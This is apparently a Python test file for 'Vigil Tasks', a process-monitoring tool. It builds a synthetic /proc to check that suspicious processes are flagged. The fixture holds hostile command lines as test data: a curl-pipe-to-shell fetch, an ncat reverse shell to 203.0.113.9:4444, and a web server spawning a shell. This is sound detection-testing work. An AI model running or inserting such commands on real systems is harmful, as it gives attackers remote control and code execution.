"""Vigil Tasks: process tree and flags from a SYNTHETIC /proc built in each test (status,
comm, cmdline, stat, exe and fd links, environ, cgroup, net/tcp), plus the shared
SYNTHETIC /proc fixture. No real process is inspected (except one live smoke check of
this test's own process), and no signal is ever sent."""

import hashlib
import json
import os
import signal
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from vigil.core import finding
from vigil.core.pkgdb import PackageFiles
from vigil.tasks import findings as F
from vigil.tasks import procs as P
from vigil.tasks.server import App

FIX = Path(__file__).parent.parent / "fixtures"
ARCH = {"ID": "arch", "PRETTY_NAME": "Arch Linux"}
HOME = "/home/alice"


class FakeProc:
    def __init__(self, tmp):
        self.root = Path(tmp, "proc")
        (self.root / "net").mkdir(parents=True)
        (self.root / "stat").write_text("cpu 0\nbtime 1793300000\n")
        for t in ("tcp", "udp"):
            (self.root / "net" / t).write_text("  sl  local_address rem_address   st tx_queue rx_queue tr tm->when "
                                               "retrnsmt   uid  timeout inode\n")
        self.n = 0

    def add(self, pid, ppid, comm, exe=None, cmdline=None, uid=1000, environ=None, cgroup=None, sockets=()):
        d = self.root / str(pid)
        (d / "fd").mkdir(parents=True)
        (d / "status").write_text(f"Name:\t{comm}\nState:\tS (sleeping)\nPid:\t{pid}\nPPid:\t{ppid}\n"
                                  f"Uid:\t{uid}\t{uid}\t{uid}\t{uid}\nThreads:\t1\n")
        (d / "comm").write_text(comm + "\n")
        (d / "cmdline").write_bytes("\0".join(cmdline if cmdline is not None else [exe or comm]).encode() + b"\0")
        (d / "stat").write_text(f"{pid} ({comm}) S {ppid} {pid} {pid} 0 -1 0 0 0 0 0 0 0 0 0 20 0 1 0 {1000 + pid} 0 0\n")
        if exe:
            os.symlink(exe, d / "exe")
        if environ is not None:
            (d / "environ").write_bytes(b"\0".join(f"{k}={v}".encode() for k, v in environ.items()) + b"\0")
        (d / "cgroup").write_text(f"0::{cgroup or '/user.slice/user-1000.slice/session-2.scope'}\n")
        for i, (kind, local, remote) in enumerate(sockets):
            self.n += 1
            inode = 5000 + self.n
            os.symlink(f"socket:[{inode}]", d / "fd" / str(3 + i))
            st = "0A" if kind == "listen" else "01"
            with open(self.root / "net/tcp", "a") as fh:
                fh.write(f"   {self.n}: {local} {remote} {st} 00000000:00000000 00:00000000 00000000  {uid}        0 "
                         f"{inode} 1 0000000000000000 100 0 0 10 0\n")


def world(tmp):
    """A SYNTHETIC desktop: systemd, a session, a browser that started a shell, a document
    viewer opening a link, a program in /tmp listening, one deleted, one updated, LD_PRELOAD,
    a fake kernel-thread name, a reverse shell, a web server running a shell, kernel threads."""
    fp = FakeProc(tmp)
    me = Path(__file__).resolve()
    fp.add(1, 0, "systemd", "/usr/lib/systemd/systemd", uid=0, cgroup="/init.scope")
    fp.add(2, 0, "kthreadd", None, cmdline=[], uid=0)
    fp.add(3, 2, "kworker/0:1", None, cmdline=[], uid=0)
    fp.add(900, 1, "systemd", "/usr/lib/systemd/systemd", cmdline=["/usr/lib/systemd/systemd", "--user"],
           cgroup="/user.slice/user-1000.slice/user@1000.service/init.scope")
    fp.add(1000, 900, "firefox", "/usr/lib/firefox/firefox", sockets=[("conn", "3201A8C0:C822", "1E6433C6:01BB")])
    fp.add(1010, 1000, "bash", "/usr/bin/bash", cmdline=["bash", "-c", "curl -s http://198.51.100.9/x | sh"])
    fp.add(1020, 900, "evince", "/usr/bin/evince")
    fp.add(1021, 1020, "sh", "/usr/bin/sh", cmdline=["sh", "-c", "xdg-open https://example.org"])
    fp.add(1100, 900, "agent", "/tmp/.x/agent", sockets=[("listen", "00000000:115C", "00000000:0000")])
    fp.add(1200, 900, "miner", "/opt/miner (deleted)")
    fp.add(1300, 900, "syncthing", "/usr/bin/syncthing (deleted)",
           cgroup="/user.slice/user-1000.slice/user@1000.service/app.slice/syncthing.service")
    fp.add(1400, 900, "game", "/usr/bin/game", environ={"HOME": HOME, "SECRET_TOKEN": "hunter2",
                                                        "LD_PRELOAD": "/home/alice/.cache/libhook.so"})
    fp.add(1500, 900, "kworker", str(me), cmdline=["[kworker/u8:2]"])
    fp.add(1600, 900, "nc", "/usr/bin/ncat", cmdline=["ncat", "203.0.113.9", "4444", "-e", "/bin/sh"])
    fp.add(1700, 1, "nginx", "/usr/sbin/nginx", uid=33, cgroup="/system.slice/nginx.service")
    fp.add(1710, 1700, "sh", "/usr/bin/dash", uid=33, cmdline=["sh", "-c", "id; uname -a"])
    fp.add(1800, 900, "helper", f"{HOME}/.cache/upd/helper")
    fp.add(1900, 900, "loader", "/memfd:payload (deleted)")
    return fp


class FakeRoot:
    """A SYNTHETIC pacman database owning the system binaries (and syncthing, updated)."""

    def __init__(self, tmp):
        self.root = Path(tmp, "root")
        d = self.root / "var/lib/pacman/local/base-1-1"
        d.mkdir(parents=True)
        (d / "desc").write_text("%NAME%\nbase\n\n%VERSION%\n1-1\n\n")
        (d / "files").write_text("%FILES%\n" + "\n".join(["usr/lib/systemd/systemd", "usr/lib/firefox/firefox",
                                                          "usr/bin/bash", "usr/bin/evince", "usr/bin/sh",
                                                          "usr/bin/syncthing", "usr/bin/game", "usr/bin/ncat",
                                                          "usr/sbin/nginx", "usr/bin/dash"]) + "\n")
        (self.root / "usr/bin").mkdir(parents=True)
        (self.root / "usr/bin/syncthing").write_text("new version")


def setup(tmp):
    fp = world(tmp)
    fr = FakeRoot(tmp)
    snap = P.snapshot(str(fp.root), PackageFiles(str(fr.root)), root=str(fr.root), now=2000.0)
    snap["viewer_uid"] = 1000      # look at it as the desktop user (tests may run as root)
    fs, per = F.build(snap, ARCH, HOME, now=2000.0)
    return snap, fs, per


def by_pid(fs):
    out = {}
    for f in fs:
        out.setdefault(int(f["evidence"][0]["value"].split()[1]), []).append(f)
    return out


class SnapshotTests(unittest.TestCase):
    def test_tree_and_fields(self):
        with tempfile.TemporaryDirectory() as tmp:
            snap, _, _ = setup(tmp)
            pr = snap["processes"]
            self.assertEqual(snap["roots"], [1, 2])
            self.assertEqual(pr[900]["children"], [1000, 1020, 1100, 1200, 1300, 1400, 1500, 1600, 1800, 1900])
            self.assertTrue(pr[3]["kernel"])
            self.assertEqual(pr[1000]["package"], "base")
            self.assertIsNone(pr[1100]["package"])
            self.assertEqual(pr[1300]["unit"]["unit"], "syncthing.service")
            self.assertTrue(pr[1300]["unit"]["user"])
            self.assertEqual(pr[1700]["unit"], {"unit": "nginx.service", "user": False, "cgroup": "/system.slice/nginx.service"})
            self.assertEqual(len(pr[1000]["sockets"]), 1)
            self.assertEqual(pr[1000]["sockets"][0]["remote_port"], 443)
            self.assertEqual(pr[1100]["sockets"][0]["kind"], "listen")
            self.assertEqual(pr[1500]["sha256"], hashlib.sha256(Path(__file__).resolve().read_bytes()).hexdigest())
            self.assertEqual(pr[1000]["started"], 1793300000 + 2000 / os.sysconf("SC_CLK_TCK"))

    def test_environment_keeps_only_linker_variables(self):
        with tempfile.TemporaryDirectory() as tmp:
            snap, fs, _ = setup(tmp)
            self.assertEqual(snap["processes"][1400]["ld"], {"LD_PRELOAD": "/home/alice/.cache/libhook.so"})
            self.assertNotIn("hunter2", json.dumps(snap, default=str))
            self.assertNotIn("hunter2", json.dumps(fs, default=str))

    def test_the_shared_proc_fixture(self):
        from ..helpers import make_proc
        with tempfile.TemporaryDirectory() as tmp:
            snap = P.snapshot(make_proc(tmp), PackageFiles(tmp), root=tmp)
            pr = snap["processes"]
            self.assertIn(4410, pr)
            self.assertTrue(pr[7000]["exe_deleted"])
            flagged = {c for c, *_ in P.flags(pr[7000], pr, HOME)}
            self.assertTrue({"deleted_binary", "temp_binary"} <= flagged)


class FlagTests(unittest.TestCase):
    def test_every_suite_flag(self):
        with tempfile.TemporaryDirectory() as tmp:
            _, fs, _ = setup(tmp)
            got = {pid: {(f["check"], f["severity"]) for f in v} for pid, v in by_pid(fs).items()}
            want = {1010: ("odd_parent", "High"), 1100: ("temp_binary", "High"), 1200: ("deleted_binary", "High"),
                    1300: ("replaced_binary", "Low"), 1400: ("ld_preload", "High"),
                    1500: ("fake_kernel_name", "High"), 1600: ("reverse_shell", "High"),
                    1710: ("odd_parent", "High"), 1800: ("cache_binary", "Medium"), 1900: ("memory_only", "High"),
                    1021: ("odd_parent", "Low")}
            for pid, pair in want.items():
                self.assertIn(pair, got.get(pid, set()), pid)
            self.assertIn(("listens_from_odd_place", "High"), got[1100])
            for quiet in (1, 900, 1000, 1020, 1700):
                self.assertNotIn(quiet, got, quiet)

    def test_titles_and_explanations(self):
        with tempfile.TemporaryDirectory() as tmp:
            _, fs, _ = setup(tmp)
            t = {f["title"] for f in fs}
            for want in ("firefox started bash", "nginx started dash", "agent runs from a temporary folder",
                         "miner keeps running after its file was deleted", "game has a library forced into it",
                         "syncthing was updated while it was running"):
                self.assertIn(want, t)
            ff = next(f for f in fs if f["title"] == "firefox started bash")
            self.assertEqual(ff["evidence"][0]["note"], "systemd → systemd → firefox → bash")
            self.assertIn("exploit", ff["likely"])
            for f in fs:
                self.assertEqual(finding.problems(f), [], f["title"])
                self.assertFalse(f["title"].endswith("…"), f["title"])

    def test_stop_is_copy_only_with_undo(self):
        with tempfile.TemporaryDirectory() as tmp:
            _, fs, _ = setup(tmp)
            f = next(f for f in fs if f["check"] == "replaced_binary")
            fix = {o["title"]: o for o in f["fixes"]["fix"]}
            self.assertEqual(fix["Pause it (reversible)"]["commands"][0]["text"], "kill -STOP 1300")
            self.assertEqual(fix["Pause it (reversible)"]["undo"][0]["text"], "kill -CONT 1300")
            self.assertEqual(fix["Stop its service syncthing.service"]["commands"][0]["text"],
                             "systemctl --user stop syncthing.service")
            self.assertEqual(fix["End it"]["commands"][0]["text"], "kill 1300")
            self.assertTrue(fix["End it"]["undo_steps"])
            srv = next(f for f in fs if f["title"] == "nginx started dash")
            self.assertEqual(next(o for o in srv["fixes"]["fix"] if o["title"] == "End it")["commands"][0]["text"],
                             "sudo kill 1710")                     # someone else's process: admin
            checks = [c["text"] for o in srv["fixes"]["check"] for c in o["commands"]]
            self.assertIn("sudo sha256sum /proc/1710/exe", checks)
            self.assertIn("pacman -Qo /usr/bin/dash", checks)

    def test_no_signal_is_ever_sent(self):
        with tempfile.TemporaryDirectory() as tmp:
            fp = world(tmp)
            boom = AssertionError("sent a signal or ran something")
            with mock.patch.object(os, "kill", side_effect=boom), mock.patch.object(os, "killpg", side_effect=boom), \
                    mock.patch.object(signal, "pthread_kill", side_effect=boom), \
                    mock.patch.object(subprocess, "run", side_effect=boom), \
                    mock.patch.object(subprocess, "Popen", side_effect=boom):
                app = App(Path(tmp, "data"), proc_root=str(fp.root), root=str(FakeRoot(tmp).root),
                          os_release_path=str(FIX / "os-release/arch"), home=HOME)
                app.api_tree({})
                app.api_scan({}, b"{}", {})
                app.close()
        src = "".join(p.read_text() for p in Path(P.__file__).parent.glob("*.py"))
        self.assertNotRegex(src, r"\bos\.kill\(|\bkillpg\(|send_signal|\.terminate\(\)")


class ServerTests(unittest.TestCase):
    def test_tree_process_scan_and_page(self):
        with tempfile.TemporaryDirectory() as tmp:
            fp = world(tmp)
            app = App(Path(tmp, "data"), proc_root=str(fp.root), root=str(FakeRoot(tmp).root),
                      os_release_path=str(FIX / "os-release/fedora"), home=HOME)
            self.addCleanup(app.close)
            t = app.api_tree({})
            self.assertEqual(t["nodes"][1000]["net"], 1)
            self.assertEqual(t["nodes"][1010]["flags"][0]["check"], "odd_parent")
            self.assertNotIn("environ", json.dumps(t))
            d = app.api_process({"pid": "1400"})
            self.assertEqual(d["ancestry"][0]["name"], "game")
            self.assertEqual(d["findings"][0]["check"], "ld_preload")
            self.assertEqual(d["findings"][0]["fixes"]["distro"]["family"], "fedora")
            with self.assertRaises(LookupError):
                app.api_process({"pid": "99999"})
            app.api_scan({}, b"{}", {})
            lines = Path(tmp, "data/findings.jsonl").read_text().splitlines()
            self.assertTrue(lines and all(json.loads(x)["tool"] == "tasks" for x in lines))
            from vigil.tasks.server import make_server
            from ..helpers import page_check
            page_check(self, make_server, app, [("/", b"<title>Vigil Tasks</title>"), ("/static/tasks.js", b"renderTree"),
                                                ("/static/tree.js", b"renderTree")])

    def test_live_snapshot_sees_this_process(self):
        snap = P.snapshot()
        me = snap["processes"][os.getpid()]
        self.assertEqual(me["pid"], os.getpid())
        self.assertTrue(me["path"])


if __name__ == "__main__":
    unittest.main()
